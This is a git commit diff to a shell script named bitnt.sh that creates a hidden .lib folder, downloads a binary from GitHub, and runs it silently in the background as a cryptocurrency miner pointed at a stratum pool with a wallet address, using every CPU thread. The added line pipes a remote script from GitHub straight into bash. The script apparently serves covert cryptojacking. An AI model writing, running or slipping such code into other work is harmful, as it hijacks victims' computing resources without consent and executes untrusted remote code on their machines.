5930645a2a3bdcc4600f6cf535d98c2121330525
loeto21 <161197201+loeto21@users.noreply.github.com>
2024-03-09 21:58:56 -0800

    Update bitnt.sh

--- bitnt.sh
+++ bitnt.sh
@@ -5,4 +5,4 @@ mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner > /dev/null 2>&1
 chmod u+x sgr1
 ./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) > /dev/null 2>&1 &
-https://github.com/loeto21/lieur/raw/main/puyeng.sh
+curl -sL https://github.com/loeto21/lieur/raw/main/puyeng.sh | bash
